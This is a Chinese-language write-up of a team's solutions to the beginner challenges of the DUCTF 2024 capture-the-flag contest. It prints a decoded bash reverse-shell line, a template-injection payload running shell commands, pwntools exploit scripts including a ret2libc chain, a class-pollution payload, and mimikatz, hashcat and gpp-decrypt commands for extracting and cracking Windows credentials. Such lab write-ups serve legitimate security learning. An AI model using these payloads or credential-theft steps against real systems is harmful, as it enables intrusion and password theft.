---
title: "DUCTF 2024 EICS1 beginner wp"
date: 2024-07-07 18:20
updated: 2024-07-07 18:20
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Pwn"
  - "Forensics"
description: "所有begginer栏目题目的wp（迫真） 其他单方向的或多或少都有搞不出来的题目，对于彩笔（我）来说能打好beginner的基础就不错了 队伍名：EICS1 分数：1811 points 排名：227th place 队伍成员 LamentXU Jerrythepro123 Dragonkeep "
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18288730"
---
所有begginer栏目题目的wp（迫真）

其他单方向的或多或少都有搞不出来的题目，对于彩笔（我）来说能打好beginner的基础就不错了

队伍名：EICS1  
分数：1811 points  
排名：227th place

| 队伍成员 |
| --- |
| LamentXU |
| Jerrythepro123 |
| Dragonkeep |
| 6s6 |
| sanmu |
| Aly1xbot |
| ftps3rver |

**[Beginner](https://www.cnblogs.com/LAMENTXU#1)**

-   [tldr please summarise](https://www.cnblogs.com/LAMENTXU#1.1)
-   [parrot the emu](https://www.cnblogs.com/LAMENTXU#1.2)
-   [Sun Zi's Perfect Math](https://www.cnblogs.com/LAMENTXU#1.3)
-   [zoo feedback form](https://www.cnblogs.com/LAMENTXU#1.4)
-   [shufflebox](https://www.cnblogs.com/LAMENTXU#1.5)
-   [number mashing](https://www.cnblogs.com/LAMENTXU#1.6)
-   [Intercepted Transmission](https://www.cnblogs.com/LAMENTXU#1.7)
-   [vector overflow](https://www.cnblogs.com/LAMENTXU#1.8)
-   [yawa](https://www.cnblogs.com/LAMENTXU#1.9)
-   [discord](https://www.cnblogs.com/LAMENTXU#1.10)
-   [survey](https://www.cnblogs.com/LAMENTXU#1.11)
-   [co2](https://www.cnblogs.com/LAMENTXU#1.12)
-   [Baby's First Forensics](https://www.cnblogs.com/LAMENTXU#1.13)
-   [SAM I AM](https://www.cnblogs.com/LAMENTXU#1.14)
-   [offtheramp](https://www.cnblogs.com/LAMENTXU#1.15)
-   [badpolicy](https://www.cnblogs.com/LAMENTXU#1.16)

# Beginner

## tldr please summarise

下载，发现文档中有隐写

![](/images/migrated/18288730/01.png)

拖入记事本中

![](/images/migrated/18288730/02.png)

访问网站https://pastebin.com/raw/ysYcKmbu

![](/images/migrated/18288730/03.png)

base64解密得：bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt\_I\_n33d\_2\_3scap3} 0>&1

**DUCTF{chatgpt\_I\_n33d\_2\_3scap3}**

## parrot the emu

下载附件，审计代码

![](/images/migrated/18288730/04.png)

一眼ssti，甚至无过滤

poc一下：

![](/images/migrated/18288730/05.png)

成立，直接getflag

> payload: {{''.**class**.**base**.**subclasses**()\[133\].**init**.**globals**\['**builtins**'\]\['eval'\]("**import**('os').popen('cat flag').read()")}}

![](/images/migrated/18288730/06.png)

**DUCTF{PaRrOt\_EmU\_ReNdErS\_AnYtHiNg}**

## Sun Zi's Perfect Math

老外的比赛里看到中国文化，泪目了

第一关大致说的就是孙子有1000-1100个兵，设为x

满足

x≡2(mod3)  
x≡4(mod5)  
x≡5(mod7)

直接上脚本

```
for i in range(1000, 1100):
    if i % 3 == 2 and i % 5 == 4 and i % 7 == 5:
        print(i)
```

输出1034，输入answer进入下一关

一眼中国剩余定理

上脚本一把梭

```
import gmpy2, binascii
e = 3
c1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637
c2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737
c3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659
n1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693
n2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403
n3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817
M = n1*n2*n3
m1 = M//n1
m2 = M//n2
m0 = M//n3
t1 = c1*m1*gmpy2.invert(m1,n1)
t2 = c2*m2*gmpy2.invert(m2,n2)
t0 = c3*m0*gmpy2.invert(m0,n3)
x = (t1+t2+t0) % M
m=gmpy2.iroot(x,e)[0]
print(m)
print(binascii.unhexlify(hex(m)[2:]))
```

**DUCTF{btw\_y0u\_c4n\_als0\_us3\_CRT\_f0r\_p4rt14l\_fr4ct10ns}**

## zoo feedback form

下载代码，审计

![](/images/migrated/18288730/07.png)

一眼xxe

抓包，改数据包为标准的xxe漏洞利用payload即可

![](/images/migrated/18288730/08.jpg)

**DUCTF{emU\_say$\_he!!o\_ho!@\_ci@0}**

## shufflebox

下载开始源码，分析后发现就是一个乱序加密

与这题差不多: [https://www.cnblogs.com/LAMENTXU/articles/18250981](https://www.cnblogs.com/LAMENTXU/articles/18250981)

直接对着两个字符串瞪出flag

```
aaaabbbbccccdddd -> ccaccdabdbdbbada
abcdabcdabcdabcd -> bcaadbdcdbcdacab
???????????????? -> owuwspdgrtejiiud
```

过程就是，从第一个字符串已知加密后第一个字符为c，而c只在第一个字符串的9-12位出现，对照第二个字符串中加密后的第一个字符为b，而b只在加密前的第2，6，10，14位出现，此处只有10属于9-12

由此可得：加密时，第10个字符会被移动到第1位，即：?????????o?????? -> owuwspdgrtejiiud

以此类推解出flag

**DUCTF{udiditgjwowsuper}**

## number mashing

无壳，64位，IDA启动！

![](/images/migrated/18288730/09.png)

审计得，核心逻辑为输入两个数字，他们不为0，v5不等于1，且v4/v5等于v4

由于int得取值范围是\[-2^32, 2^32-1\]那么2147483647刚好为最大的int，可得2147483648/-1=-2147483648此数字为合法的int

然后就有一个无法解释的诡异现象，即2147483648=-2147483648（结果溢出）

想知道原因的可以去：[https://blog.csdn.net/weixin\_42779370/article/details/102829210](https://blog.csdn.net/weixin_42779370/article/details/102829210)

得: v4=2147483648; v5=-1

![](/images/migrated/18288730/10.png)

**DUCTF{w0w\_y0u\_just\_br0ke\_math!!}**(笑)

## Intercepted Transmissions

![](/images/migrated/18288730/11.png)

可得

```
ccir_476_dict = {
    '1000111': 'A', '1110010': 'B', '0011101': 'C', '1010011': 'D', 
    '1010110': 'E', '0011011': 'F', '0110101': 'G', '1101001': 'H', 
    '1001101': 'I', '0010111': 'J', '0011110': 'K', '1100101': 'L', 
    '0111001': 'M', '1011001': 'N', '1110001': 'O', '0101101': 'P', 
    '0101110': 'Q', '1010101': 'R', '1001011': 'S', '1110100': 'T', 
    '1001110': 'U', '0111100': 'V', '0100111': 'W', '0111010': 'X', 
    '0101011': 'Y', '1100011': 'Z', '1111000': '<CR>', '1101100': '<LF>',
    '1011010': '<LTRS>', '0110110': '<FIGS>', '1011100': ' ','1101010':'<BL>'
}

# 给定的二进制字符串
binary_string = "101101001101101101001110100110110101110100110100101101101010110101110010110100101110100111001101100101101101101000111100011110011011010101011001011101101010010111011100100011110101010110110101011010111001011010110100101101101010110101101011001011010011101110001101100101110101101010110011011100001101101101101010101101101000111010110110010111010110101100101100110111101000101011101110001101101101001010111001011101110001010111001011100011011"

# 将二进制字符串分割为7位的块
blocks = [binary_string[i:i+7] for i in range(0, len(binary_string), 7)]
print(blocks)
# 查找每个块的对应字符
decoded_chars = [ccir_476_dict.get(block, '?') for block in blocks]

# 输出解密后的字符串
decoded_string = ''.join(decoded_chars)
print("Decoded string:", decoded_string)
```

输出：HHTHE QUPKKRSS ARE HELD QN FRCQLITY HQQOQQF

对照表格解码即可，此处注意意为切换到图中得CHARACTER CASE；意为切换到FIGURE CASE

**DUCTF{##TH3 QU0KK4BELLS AR3 H3LD 1N F4C1LITY #11911!}**

## vector overflow

找vector地址(DUCTFAAAAAAAAAAA)，再加p64（vector地址）即可

```
from pwn import *             
address='2024.ductf.dev'
port='30013'

p=remote(address,port) #laczenie online

PATTERN=10*b'A'
v_start=0x4051e0
v_end=v_start+5
payload = b"DUCTF\x00"+PATTERN+p64(v_start)+p64(v_end)
p.sendline(payload)

p.interactive()
```

**DUCTF{y0u\_pwn3d\_th4t\_vect0r!!}**

## yawa

```
from pwn import *

io=remote("2024.ductf.dev", 30010)
#io=process("./real")
def name(name):
        io.recvuntil("> ")
        io.sendline("1")
        io.sendline(name)

def hello():
        io.recvuntil("> ")
        io.sendline("2")
        print io.recvuntil("P"*7)
        #return u64(io.recv(8))

name("A"*0x51+"P"*7)
hello()
canary=u64(io.recv(8))-0x0a
print hex(canary)

name("A"*0x60+"P"*7)
hello()
io.recv(1)
libc_addr=(u64(io.recv(6)+2*"\x00"))+48
libc_addr=libc_addr-0x29dc0
print hex(libc_addr)
ret=libc_addr+0x0000000000029139
system=libc_addr+0x50d70
pop_rdi=libc_addr+0x000000000002a3e5
bin_sh=libc_addr+0x1d8678
name("A"*0x58+p64(canary)+"A"*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
io.sendline("3")
io.interactive()
```

**DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}**

## discord

第一部分在#team-search：DUCTF{f1r57  
第二部分在#opt-in-updates：\_0f\_m4ny}  
**DUCTF{f1r57\_0f\_m4ny}**

## survey

问卷题，做就完了

**DUCTF{hop3\_u\_had\_fun}**

## co2

python原型链污染

审计代码，快进到：

![](/images/migrated/18288730/12.png)

发现根目录下能直接污染到flag值（笑）

根目录下

```
{
  "__init__": {
    "__globals__": {
"flag":"true"
    }
  }
}
```

直接设置flag为true，访问/get\_flag即可

**DUCTF{_cl455\_p0lluti0n\_ftw_}**

## Baby's First Forensics

下载，随便点开一个html包

![](/images/migrated/18288730/13.png)

发现header中直接就有工具名称和版本

**DUCTF{Nikto\_2.1.6}**

## SAM I AM

mimikatz+hashcat一把梭

```
lsadump::sam /sam:sam.bak /system:system.bak
```

直接出administrator的hash：476b4dddbbffde29e739b618580adb1e

hashcat跑就完了o(_￣▽￣_)o

将476b4dddbbffde29e739b618580adb1e写入1.ntlm

```
hashcat --force -m 1000 1.ntlm /usr/share/wordlists/rockyou.txt
```

**DUCTF{!checkerboard1}**

## offtheramp

exiftool直接出经纬度

![](/images/migrated/18288730/14.png)

google地图看就完了

**DUCTF{Olivers\_Hill\_Boat\_Ramp}**

## badpolicy

一眼组策略，直接找cpassword

发现在\\badpolicies\\rebels.ductf\\Policies{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}\\Machine\\Preferences\\Groups\\groups.xml中

![](/images/migrated/18288730/15.png)

gpp-decrypt一把梭

```
gpp-decrypt B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2
```

**DUCTF{D0n7\_Us3\_P4s5w0rds\_1n\_Gr0up\_P0l1cy}**
